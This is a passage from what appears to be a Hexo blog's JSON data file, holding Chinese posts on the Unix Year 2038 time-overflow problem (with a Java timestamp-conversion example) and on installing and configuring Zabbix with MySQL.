Pi等等）</strong></p>\n<p><strong>当然你大可不必担心你的手机会遭遇2038年问题，因为你现在的手机大概不会一直用到2038年（也许再过几个月你就会淘汰掉旧的去换新的了！）。剩下来的，就是桌面和服务器所要面临的问题了。</strong></p>\n<p><strong>所幸的是，摆脱了嵌入式设备的局限性，我们在桌面和服务器上已经有了众多的64位体系架构可供选择。而且，目前绝大多数的64位操作系统，也都自然而然地采用了64位time_t类型（相当于long long int或者int64）。</strong></p>\n<p><strong>问题解决了。只要我们可以预期现有的计算机都能在2038年之前迁移到64位系统（准确地说，是采用了64位time_t的系统），Unix纪元就不会迎来末日。到了那一天，所有的计算机系统仍然能正常工作，人类文明完好如初。</strong></p>\n<p><strong>传统的32位Unix纪元时间会在2038年发生算术溢出，然后迎接末日。64位纪元当然也是会有这一天的，那将是在</strong></p>\n<p><code>15:30:08 UTC on Sun, 4 December 292,277,026,596</code></p>\n<p><strong>这个时间已经远远超过了预计太阳扩张成红巨星并吞噬地球的时间。所以，在此之前，已经没有什么好担心的了。我确信，要么人类文明要么根本都熬不到那一天，要么等到那一天，我们早就达到了拥有任意操纵时间和空间的能力的技术奇点，人类文明将获得永生（跑题了。。。）；要么就是，所有的电脑都已经迁移到了128位。（这当然是最简单的解决办法）</strong></p>\n<h2 id=\"你的系统如何？\"><a href=\"#你的系统如何？\" class=\"headerlink\" title=\"你的系统如何？\"></a>你的系统如何？</h2><p><strong>想知道自己的Unix系统是否会在2038年1月19日这一天迎来末日，只要看系统能否正确显示Unix纪元第2,147,483,648秒的日期即可。</strong></p>\n<p><strong>在GNU/Linux上，执行：(GNU date)</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ date -ud @2147483648</span><br></pre></td></tr></table></figure></p>\n<p><strong>如果系统使用了64位时间，结果应该是正常的：（后文中假定时区一律设为export TZ=”UTC”）</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2038年 01月 19日 星期二 03:14:08 UTC</span><br></pre></td></tr></table></figure></p>\n<p><strong>那么恭喜，你的系统可以平安无恙地度过2038年末日。如果出现1901年或者其他神马奇怪结果的话，自己看着办吧。</strong></p>\n<p><strong>另：Unix是否会发生2038年问题并不绝对取决于是32位系统还是64位系统。这由具体系统中对time_t类型的实现决定。NetBSD和OpenBSD的早期版本在amd64平台上仍然使用了32位time_t，因此仍然会发生2038年问题。如今也有一些32位系统开始使用64位的time_t类型（典型的例子：今年10月份发布的NetBSD 6.0，在32位和64位平台上一律改成了64位time_t）。64位Linux上已经在使用64位的time_t了，而32位Linux上则似乎仍然是32位。</strong></p>\n<h2 id=\"那么我遇到了什么问题\"><a href=\"#那么我遇到了什么问题\" class=\"headerlink\" title=\"那么我遇到了什么问题\"></a>那么我遇到了什么问题</h2><p><strong>在编写云计算项目程序的时候，我将unix时间转换为<code>java</code>的<code>Date</code>类型，但是我忘了java的时间默认是以<code>ms</code>为单位，所有我转换unix时间的时候原本单位是<code>s</code>，结果<code>java</code>把它当作<code>ms</code>，这样的结果就是原本时间应该是2016年6月1日的时间，变成了1970年1月的某一天。因此，在转换的时候要记得在unix时间上乘以1000</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">contextLoads</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tSimpleDateFormat format = <span class=\"keyword\">new</span> SimpleDateFormat(<span class=\"string\">\"yyyy-MM-dd HH:mm:ss\"</span>);</span><br><span class=\"line\">\t\tLong time = Long.parseLong(<span class=\"string\">\"1496246559\"</span>)*<span class=\"number\">1000</span>;</span><br><span class=\"line\">\t\tString d = format.format(time);</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\tDate date = format.parse(d);</span><br><span class=\"line\">\t\t\tSystem.out.println(date);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">catch</span> (ParseException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料-相关链接\"><a href=\"#参考资料-相关链接\" class=\"headerlink\" title=\"参考资料/相关链接\"></a>参考资料/相关链接</h2><ul>\n<li>关于2038年问题<ul>\n<li><a href=\"http://en.wikipedia.org/wiki/Year_2038_problem\" target=\"_blank\" rel=\"external\">http://en.wikipedia.org/wiki/Year_2038_problem</a></li>\n<li><a href=\"http://www.y2038.com/\" target=\"_blank\" rel=\"external\">http://www.y2038.com/</a></li>\n</ul>\n</li>\n<li>关于计算机纪元法和Unix时间<ul>\n<li><a href=\"\">https://en.wikipedia.org/wiki/Epoch_(reference_date)#Computing</a></li>\n<li><a href=\"http://en.wikipedia.org/wiki/Unix_time\" target=\"_blank\" rel=\"external\">http://en.wikipedia.org/wiki/Unix_time</a></li>\n</ul>\n</li>\n<li>原创链接<ul>\n<li><a href=\"http://ju.outofmemory.cn/entry/95734\" target=\"_blank\" rel=\"external\">http://ju.outofmemory.cn/entry/95734</a></li>\n</ul>\n</li>\n</ul>\n","excerpt":"<h2 id=\"故事缘由\"><a href=\"#故事缘由\" class=\"headerlink\" title=\"故事缘由\"></a>故事缘由</h2><p><strong>有时候不得不相信，有些东西就是刚刚好，刚刚好到来，刚刚好知道，刚刚好契合。因为这些刚刚好，就会不由自主的激动，感觉这些刚知道的东西发生在自己身上。这次要说的是unix时间问题，我最开始接触这个问题是我们云计算课程项目中一个小小的时间问题，当时项目中所有的时间都是通过unix时间记录。所谓unix时间，就是记录从unix元年1970年1月1日0点起到当前时间经过的秒数。这个问题最开始我并没有觉得有什么问题，但后来我在网上瞎逛的时候看见了一篇文章 <a href=\"http://www.wttech.org/archives/3960\">十大著名的计算机发展史上的软件缺陷</a> ,这里就讲到了一个unix时间问题，我就很好奇的去了解这一个故事，而在这个时间点，我们正在进行的操作系统课程也讲到了unix时间，所以这一堆堆事情，就刚刚好地发生了。 </strong><br>","more":"</p>\n<h2 id=\"2038问题\"><a href=\"#2038问题\" class=\"headerlink\" title=\"2038问题\"></a>2038问题</h2><p><strong>2038年问题的成因与20世纪90年代曾经名噪一时的千年虫问题很类似。千年虫问题是因为早期(早在20世纪50年前以前)程序员们使用两位十进制数字来表示年份(为了节约存储空间和书写程序的便利)，并且在很长一段时间内，没有意识到这么做可能给后人带来的麻烦;当所有人都习惯这么做时，随着软件系统变得越来越复杂，小问题就逐渐变成大问题了。</strong></p>\n<p><strong>说起Unix上的2038年问题，时间要追溯到1969年。当Ken Thompson和Dennis Ritchie在贝尔实验室里捣鼓他们的新玩意时，他们肯定没有想到他们的小发明将来会在全世界发挥如此大的影响力。他们决定把他们所创造的这个支持多用户多任务的新操作系统命名为UNIX，以一个32位二进制数所能表示的有符号整数范围（-2,147,483,648 ~ +2,147,483,647）所代表的秒数作为Unix纪元（Unix epoch）时间，把西元1970年1月1日0时0分0秒定为Unix纪元的元年。</strong></p>\n<p><strong>在Unix历的约第100,000,000秒（或者，用人类的纪年法，大约在西元1972~1973年之间），一种叫做C的高级程序语言被发明出来了。于是，贝尔实验室的这帮人用C语言重写了他们的UNIX系统内核，很自然地，系统库中用于存储时间的time_t类型的typedef定义，就采用了C语言中对应的32位有符号整型（signed int32）来实现。</strong></p>\n<p><strong>起初，一切都很好。UNIX走出了贝尔实验室中少数研究人员的小圈子，得到了工业界的青睐，好几家商业公司都发行了自己的Unix变体，其中包括最早的商业版UNIX System V以及后来的IBM AIX、HP-UX、SGI的IRIX和微软的Xenix，它们被广泛用在各式大中小型主机和服务器上。到了80年代初，当时在麻省理工大学人工智能实验室工作的一个大胡子黑客不满于Unix这种专有软件的闭源开发模式，他决定重写一个完全自由的仿Unix操作系统，但又不是Unix，这就是后来的GNU (GNU is Not Unix) Project；与此同时，在西海岸，UC Berkeley的另一群黑客获得了一部分来自最初贝尔实验室的Unix原始代码，他们在此基础上开发出属于自己的一套“伯克利软件发行包（Berkeley Software Distribution）”，这演变成了后来的BSD家族。很快，时间已经到了Unix纪元的第31年，在大洋彼岸的北欧国家芬兰，一个年轻大学生自己写了一个仿Unix内核，受到当时GNU发起的自由软件运动的影响，他决定把这个内核以GPL协议发放出来，让全世界的黑客们来共同使用、参与开发。恰好那时GNU操作系统还没有自己的成熟内核，这个后来被命名为“Linux”的仿Unix内核借着与GNU Project的结合获得了广泛的成功与关注。最终，就有了我们今天所使用的GNU/Linux。在很长一段时间里，不管是真正的Unix和由它直接衍生而来的BSD、Solaris，还是试图“仿造出”Unix的GNU/Linux，抑或是为了统一各种类Unix（*nix）系统而生的POSIX标准，所有的类Unix系统都把time_t类型理所当然地等价为C语言中的原生数据类型signed int32，无数的库和工具被基于它写出来，很多网络上的服务与应用也是基于这个事实的标准。</strong></p>\n<p><strong>终于有一天，人们意识到，32 bits整数所能表示的数目大小毕竟是有限的，更何况这个数字是以秒作为单位。对于正在各行各业发挥着越来越重要作用的类Unix系统来说，当初的设定显然也太目光短浅了些。</strong></p>\n<p><strong>32位有符号整型所能表示的最大数是+2,147,483,647。2147483647秒 = 24855天 = 68年。也就是说，自Unix纪元的元年（1970年）起，再过68年，所有现存的32位类Unix系统都将迎来历法上的终结——对+2,147,483,647加1将造成一个算术溢出：在大部分系统上，返回值会变成-2,147,483,648，在少数系统上，返回值可能是0。许多依赖于系统时间的程序将无法正常工作，计算机的时钟也将退回到1901年（或者1970年）。它们将无法正确处理那之后的时间。</strong></p>\n<p><strong>这个准确的时刻是：协调世界时2038年1月19日3时14分7秒（未考虑闰秒）。你可以在维基百科上找到更多的信息。</strong></p>\n<h2 id=\"更多的“xx”年问题\"><a href=\"#更多的“xx”年问题\" class=\"headerlink\" title=\"更多的“xx”年问题\"></a>更多的“xx”年问题</h2><p><strong>一个与Unix的2038年问题相类似的是NTP协议的2036年问题。NTP协议的时间戳采用了和Unix相似的32位整数表示，不同于Unix的1970 ± 68年范围，NTP使用的是无符号整型，并且以1900作为时间的起点，这意味着它的终点将是1900 + 136 = 2036年2月6日。</strong></p>\n<p><strong>和2038年问题直接相关的两个历史事件是2001年9月9日问题和2004年日本银行ATM机故障：</strong><br><strong>2001年9月9日问题又被称作S1G（Second 1 Giga，一吉秒）或者S1B（Second 1 Billion）问题。在那一天，Unix纪元时间迎来了第1,000,000,000秒，由于某些软件中使用了字符串来存储时间戳，当字符串变成”1000000000”时，字典排序的结果会产生”999999999” ＞ “1000000000”，这造成了相当一部分程序不能正常判断时间差，影响到正常工作。（我一直以为只有不上路子的2B程序员才会这么去做判断，没想到还真不少，包括KDE在内。。。）</strong></p>\n<p><strong>2004年1月10日恰好是1970年到2038年时间轴上的中点——显然，如果你在程序中出于某种目的将Unix时间乘以了2，那么它将不能正常工作。这在日本某些银行使用了IBM软件的ATM机上确实发生了。（至于究竟为什么要把时间乘以2，我只能表示不明觉厉。）</strong></p>\n<p><strong>可以肯定地说，全世界的程序员都是一群爱偷懒的货。</strong></p>\n<h2 id=\"轻松一刻\"><a href=\"#轻松一刻\" class=\"headerlink\" title=\"轻松一刻\"></a>轻松一刻</h2><p><strong>在2001年S1B问题发生之前的4月19日，恰好迎来了Unix纪元的第987,654,321秒。虽然没什么实质意义（估计没有哪个程序会无聊到去计算时间戳中不同数字的个数），但这还是在Slashdot上激起了不少讨论。</strong></p>\n<p><strong>2009年2月13日11:31:30，是Unix纪元的第1,234,567,890秒。这天刚好是星期五，又是一个13号，也就是西方文化中所谓的黑色星期五。世界各地不少Unix社区都在举办活动庆祝此事，包括Google的hackers们。他们甚至还做了一个Doodle：</strong><br><img src=\"https://www.google.com/logos/unix1234567890.gif\" alt=\"\"></p>\n<h2 id=\"从32位到64位\"><a href=\"#从32位到64位\" class=\"headerlink\" title=\"从32位到64位\"></a>从32位到64位</h2><p><strong>解决2038年问题的办法看似很简单：因为time_t类型本来就是依赖于C POSIX库的具体实现的，并没有哪个规范规定它必须是32位，直接把它改成64位不就行了吗？</strong></p>\n<p><strong>问题是，直接这么改，会破坏很多现有程序（工具、服务……）的兼容性。几乎所有的32位系统都自然而然地采用了32位的time_t，这其中包括了现在绝大多数基于ARM处理器的电子产品（只要它们的底层系统是基于类Unix的——这包括iPad、iPhone、所有Android手机、PS Vita还有Raspberry Pi等等）</strong></p>\n<p><strong>当然你大可不必担心你的手机会遭遇2038年问题，因为你现在的手机大概不会一直用到2038年（也许再过几个月你就会淘汰掉旧的去换新的了！）。剩下来的，就是桌面和服务器所要面临的问题了。</strong></p>\n<p><strong>所幸的是，摆脱了嵌入式设备的局限性，我们在桌面和服务器上已经有了众多的64位体系架构可供选择。而且，目前绝大多数的64位操作系统，也都自然而然地采用了64位time_t类型（相当于long long int或者int64）。</strong></p>\n<p><strong>问题解决了。只要我们可以预期现有的计算机都能在2038年之前迁移到64位系统（准确地说，是采用了64位time_t的系统），Unix纪元就不会迎来末日。到了那一天，所有的计算机系统仍然能正常工作，人类文明完好如初。</strong></p>\n<p><strong>传统的32位Unix纪元时间会在2038年发生算术溢出，然后迎接末日。64位纪元当然也是会有这一天的，那将是在</strong></p>\n<p><code>15:30:08 UTC on Sun, 4 December 292,277,026,596</code></p>\n<p><strong>这个时间已经远远超过了预计太阳扩张成红巨星并吞噬地球的时间。所以，在此之前，已经没有什么好担心的了。我确信，要么人类文明要么根本都熬不到那一天，要么等到那一天，我们早就达到了拥有任意操纵时间和空间的能力的技术奇点，人类文明将获得永生（跑题了。。。）；要么就是，所有的电脑都已经迁移到了128位。（这当然是最简单的解决办法）</strong></p>\n<h2 id=\"你的系统如何？\"><a href=\"#你的系统如何？\" class=\"headerlink\" title=\"你的系统如何？\"></a>你的系统如何？</h2><p><strong>想知道自己的Unix系统是否会在2038年1月19日这一天迎来末日，只要看系统能否正确显示Unix纪元第2,147,483,648秒的日期即可。</strong></p>\n<p><strong>在GNU/Linux上，执行：(GNU date)</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ date -ud @2147483648</span><br></pre></td></tr></table></figure></p>\n<p><strong>如果系统使用了64位时间，结果应该是正常的：（后文中假定时区一律设为export TZ=”UTC”）</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2038年 01月 19日 星期二 03:14:08 UTC</span><br></pre></td></tr></table></figure></p>\n<p><strong>那么恭喜，你的系统可以平安无恙地度过2038年末日。如果出现1901年或者其他神马奇怪结果的话，自己看着办吧。</strong></p>\n<p><strong>另：Unix是否会发生2038年问题并不绝对取决于是32位系统还是64位系统。这由具体系统中对time_t类型的实现决定。NetBSD和OpenBSD的早期版本在amd64平台上仍然使用了32位time_t，因此仍然会发生2038年问题。如今也有一些32位系统开始使用64位的time_t类型（典型的例子：今年10月份发布的NetBSD 6.0，在32位和64位平台上一律改成了64位time_t）。64位Linux上已经在使用64位的time_t了，而32位Linux上则似乎仍然是32位。</strong></p>\n<h2 id=\"那么我遇到了什么问题\"><a href=\"#那么我遇到了什么问题\" class=\"headerlink\" title=\"那么我遇到了什么问题\"></a>那么我遇到了什么问题</h2><p><strong>在编写云计算项目程序的时候，我将unix时间转换为<code>java</code>的<code>Date</code>类型，但是我忘了java的时间默认是以<code>ms</code>为单位，所有我转换unix时间的时候原本单位是<code>s</code>，结果<code>java</code>把它当作<code>ms</code>，这样的结果就是原本时间应该是2016年6月1日的时间，变成了1970年1月的某一天。因此，在转换的时候要记得在unix时间上乘以1000</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">contextLoads</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tSimpleDateFormat format = <span class=\"keyword\">new</span> SimpleDateFormat(<span class=\"string\">\"yyyy-MM-dd HH:mm:ss\"</span>);</span><br><span class=\"line\">\t\tLong time = Long.parseLong(<span class=\"string\">\"1496246559\"</span>)*<span class=\"number\">1000</span>;</span><br><span class=\"line\">\t\tString d = format.format(time);</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\tDate date = format.parse(d);</span><br><span class=\"line\">\t\t\tSystem.out.println(date);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">catch</span> (ParseException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料-相关链接\"><a href=\"#参考资料-相关链接\" class=\"headerlink\" title=\"参考资料/相关链接\"></a>参考资料/相关链接</h2><ul>\n<li>关于2038年问题<ul>\n<li><a href=\"http://en.wikipedia.org/wiki/Year_2038_problem\">http://en.wikipedia.org/wiki/Year_2038_problem</a></li>\n<li><a href=\"http://www.y2038.com/\">http://www.y2038.com/</a></li>\n</ul>\n</li>\n<li>关于计算机纪元法和Unix时间<ul>\n<li><a href=\"\">https://en.wikipedia.org/wiki/Epoch_(reference_date)#Computing</a></li>\n<li><a href=\"http://en.wikipedia.org/wiki/Unix_time\">http://en.wikipedia.org/wiki/Unix_time</a></li>\n</ul>\n</li>\n<li>原创链接<ul>\n<li><a href=\"http://ju.outofmemory.cn/entry/95734\">http://ju.outofmemory.cn/entry/95734</a></li>\n</ul>\n</li>\n</ul>"},{"title":"zabbix安装配置","date":"2017-08-22T07:18:23.000Z","_content":"\n## 下载软件包\n**从[zabbix](https://www.zabbix.com/download)上下载所需要的软件包，包括`zabbix-server-mysql`和`zabbix-frontend-php`，如果还要安装客户端，还要下载`zabbix-agent`。(推荐直接添加`zabbix`源)**\n\n## 安装软件\n``` bash\nsudo dpkg -i zabbix-server-mysql_3.4.0-1+xenial_amd64.deb\nsudo dpkg -i zabbix-frontend-php_3.4.0-1+xenial_all.deb\n```\n\n## 配置Zabbix server\n``` bash\nsudo vim /etc/zabbix/zabbix_server.conf\n```\n修改其中的`DBhost`, `DBUser`, `DBPassword`， 如果有必要，需要设置`socket`与`mysql`的`socket`相同。\n<!-- more -->\n## 配置MySQL\n``` sql\ncreate database zabbix character set utf8 collate utf8_bin;\ngrant all privileges on zabbix.* to 'zabbix'@'localhost';\nflush privileges;\nexit;\n```\n找到`zabbix-server-mysql`文件夹，文件夹中是zabbix数据库数据填充文件用来填充数据库\n``` bash\nzcat *.sql.gz | mysql -uzabbix -p zabbix\n```\n如果是三个sql文件，填充顺序是`schema.sql.gz`->`images.sql.gz`->`data.sql`\n\n## 配置PHP\n按照需要修改`php.ini`配置项\n\n## Zabbix web\n**将Zabbix的web页面文件拷贝到LNMP的指定目录，启动`Zabbix-server`进入`http://ip/zabbix`按步骤填写相关信息，最后成功安上，最后再配合客户端进行监控**\n\n## Zabbix 检测数据库\n**首先在Zabbix网页上为host添加一个数据库模块，然后需要修改客户端数据，在客户端的`/etc/zabbix/zabbix-agentd.d/userparameter_mysql.conf`文件中根据文件指示将文件中所有HOME变量换为含有数据库连接文件`.my.cnf`的目录，我暂时将`.my.cnf`放在`/etc/zabbix`下面，然后编写`.my.cnf`**\n``` bash\n[mysql]\nuser=zabbix\npassword=zabbix\nhost=localhost\n\n[mysqladmin]\nuser=zabbix\npassword=zabbix\nhost=localhost\n```\n**最后也是最重要的一步，重启数据库，上面步骤都做了，但网页上数据没有更新，原因就是数据库没有重启**\n\n## 附言\n**写得很草率，还在学习中，会努力更新....**\n","source":"_posts/zabbix.md","raw":"---\ntitle: zabbix安装配置\ntag: zabbix\ndate: 2017-08-22 15:18:23\ncategories: linux\n---\n\n## 下载软件包\n**从[zabbix](https://www.zabbix.com/download)上下载所需要的软件包，包括`zabbix-server-mysql`和`zabbix-frontend-php`，如果还要安装客户端，还要下载`zabbix-agent`。(推荐直接添加`zabbix`源)**\n\n## 安装软件\n``` bash\nsudo dpkg -i zabbix-server-mysql_3.4.0-1+xenial_amd64.deb\nsudo dpkg -i zabbix-frontend-php_3.4.0-1+xenial_all.deb\n```\n\n## 配置Zabbix server\n``` bash\nsudo vim /etc/zabbix/zabbix_server.conf\n```\n修改其中的`DBhost`, `DBUser`, `DBPassword`， 如果有必要，需要设置`socket`与`mysql`的`socket`相同。\n<!-- more -->\n## 配置MySQL\n``` sql\ncreate database zabbix character set utf8 collate utf8_bin;\ngrant all privileges on zabbix.* to 'zabbix'@'localhost';\nflush privileges;\nexit;\n```\n找到`zabbix-server-mysql`文件夹，文件夹中是zabbix数据库数据填充文件用来填充数据库\n``` bash\nzcat *.sql.gz | mysql -uzabbix -p zabbix\n```\n如果是三个sql文件，填充顺序是`schema.sql.gz`->`images.sql.gz`->`data.sql`\n\n## 配置PHP\n按照需要修改`php.ini`配置项\n\n## Zabbix web\n**将Zabbix的web页面文件拷贝到LNMP的指定目录，启动`Zabbix-server`进入`http://ip/zabbix`按步骤填写相关信息，最后成功安上，最后再配合客户端进行监控**\n\n## Zabbix 检测数据库\n**首先在Zabbix网页上为host添加一个数据库模块，然后需要修改客户端数据，在客户端的`/etc/zabbix/zabbix-agentd.d/userparameter_mysql.conf`文件中根据文件指示将文件中所有HOME变量换为含有数据库连接文件`.my.cnf`的目录，我暂时将`.my.cnf`放在`/etc/zabbix`下面，然后编写`.my.cnf`**\n``` bash\n[mysql]\nuser=zabbix\npassword=zabbix\nhost=localhost\n\n[mysqladmin]\nuser=zabbix\npassword=zabbix\nhost=localhost\n```\n**最后也是最重要的一步，重启数据库，上面步骤都做了，但网页上数据没有更新，原因就是数据库没有重启**\n\n## 附言\n**写得很草率，还在学习中，会努力更新....**\n","slug":"zabbix","published":1,"updated":"2017-11-28T03:10:39.013Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczx0032yp0lyqllcgld","content":"<h2 id=\"下载软件包\"><a href=\"#下载软件包\" class=\"headerlink\" title=\"下载软件包\"></a>下载软件包</h2><p><strong>从<a href=\"https://www.zabbix.com/download\" target=\"_blank\" rel=\"external\">zabbix</a>上下载所需要的软件包，包括<code>zabbix-server-mysql</code>和<code>zabbix-frontend-php</code>，如果还要安装客户端，还要下载<code>zabbix-agent</code>。(推荐直接添加<code>zabbix</code>源)</strong></p>\n<h2 id=\"安装软件\"><a href=\"#安装软件\" class=\"headerlink\" title=\"安装软件\"></a>安装软件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i zabbix-server-mysql_3.4.0-1+xenial_amd64.deb</span><br><span class=\"line\">sudo dpkg -i zabbix-frontend-php_3.4.0-1+xenial_all.deb</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置Zabbix-server\"><a href=\"#配置Zabbix-server\" class=\"headerlink\" title=\"配置Zabbix server\"></a>配置Zabbix server</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/zabbix/zabbix_server.conf</span><br></pre></td></tr></table></figure>\n<p>修改其中的<code>DBhost</code>, <code>DBUser</code>, <code>DBPassword</code>， 如果有必要，需要设置<code>socket</code>与<code>mysql</code>的<code>socket</code>相同。<br><a id=\"more\"></a></p>\n<h2 id=\"配置MySQL\"><a href=\"#配置MySQL\" class=\"headerlink\" title=\"配置MySQL\"></a>配置MySQL</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> zabbix <span class=\"built_in\">character</span> <span class=\"keyword\">set</span> utf8 <span class=\"keyword\">collate</span> utf8_bin;</span><br><span class=\"line\"><span class=\"keyword\">grant</span> all <span class=\"keyword\">privileges</span> <span class=\"keyword\">on</span> zabbix.* <span class=\"keyword\">to</span> <span class=\"string\">'zabbix'</span>@<span class=\"string\">'localhost'</span>;</span><br><span class=\"line\"><span class=\"keyword\">flush</span> <span class=\"keyword\">privileges</span>;</span><br><span class=\"line\">exit;</span><br></pre></td></tr></table></figure>\n<p>找到<code>zabbix-server-mysql</code>文件夹，文件夹中是zabbix数据库数据填充文件用来填充数据库<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zcat *.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure></p>\n<p>如果是三个sql文件，填充顺序是<code>schema.sql.gz</code>-&gt;<code>images.sql.gz</code>-&gt;<code>data.sql</code></p>\n<h2 id=\"配置PHP\"><a href=\"#配置PHP\" class=\"headerlink\" title=\"配置PHP\"></a>配置PHP</h2><p>按照需要修改<code>php.ini</code>配置项</p>\n<h2 id=\"Zabbix-web\"><a href=\"#Zabbix-web\" class=\"headerlink\" title=\"Zabbix web\"></a>Zabbix web</h2><p><strong>将Zabbix的web页面文件拷贝到LNMP的指定目录，启动<code>Zabbix-server</code>进入<code>http://ip/zabbix</code>按步骤填写相关信息，最后成功安上，最后再配合客户端进行监控</strong></p>\n<h2 id=\"Zabbix-检测数据库\"><a href=\"#Zabbix-检测数据库\" class=\"headerlink\" title=\"Zabbix 检测数据库\"></a>Zabbix 检测数据库</h2><p><strong>首先在Zabbix网页上为host添加一个数据库模块，然后需要修改客户端数据，在客户端的<code>/etc/zabbix/zabbix-agentd.d/userparameter_mysql.conf</code>文件中根据文件指示将文件中所有HOME变量换为含有数据库连接文件<code>.my.cnf</code>的目录，我暂时将<code>.my.cnf</code>放在<code>/etc/zabbix</code>下面，然后编写<code>.my.cnf</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysql]</span><br><span class=\"line\">user=zabbix</span><br><span class=\"line\">password=zabbix</span><br><span class=\"line\">host=localhost</span><br><span class=\"line\"></span><br><span class=\"line\">[mysqladmin]</span><br><span class=\"line\">user=zabbix</span><br><span class=\"line\">password=zabbix</span><br><span class=\"line\">host=localhost</span><br></pre></td></tr></table></figure></p>\n<p><strong>最后也是最重要的一步，重启数据库，上面步骤都做了，但网页上数据没有更新，原因就是数据库没有重启</strong></p>\n<h2 id=\"附言\"><a href=\"#附言\" class=\"headerlink\" title=\"附言\"></a>附言</h2><p><strong>写得很草率，还在学习中，会努力更新….</strong></p>\n","excerpt":"<h2 id=\"下载软件包\"><a href=\"#下载软件包\" class=\"headerlink\" title=\"下载软件包\"></a>下载软件包</h2><p><strong>从<a href=\"https://www.zabbix.com/download\">zabbix</a>上下载所需要的软件包，包括<code>zabbix-server-mysql</code>和<code>zabbix-frontend-php</code>，如果还要安装客户端，还要下载<code>zabbix-agent</code>。(推荐直接添加<code>zabbix</code>源)</strong></p>\n<h2 id=\"安装软件\"><a href=\"#安装软件\" class=\"headerlink\" title=\"安装软件\"></a>安装软件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i zabbix-server-mysql_3.4.0-1+xenial_amd64.deb</span><br><span class=\"line\">sudo dpkg -i zabbix-frontend-php_3.4.0-1+xenial_all.deb</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置Zabbix-server\"><a href=\"#配置Zabbix-server\" class=\"headerlink\" title=\"配置Zabbix server\"></a>配置Zabbix server</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/zabbix/zabbix_server.conf</span><br></pre></td></tr></table></figure>\n<p>修改其中的<code>DBhost</code>, <code>DBUser</code>, <code>DBPassword</code>， 如果有必要，需要设置<code>socket</code>与<code>mysql</code>的<code>socket</code>相同。<br>","more":"</p>\n<h2 id=\"配置MySQL\"><a href=\"#配置MySQL\" class=\"headerlink\" title=\"配置MySQL\"></a>配置MySQL</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span 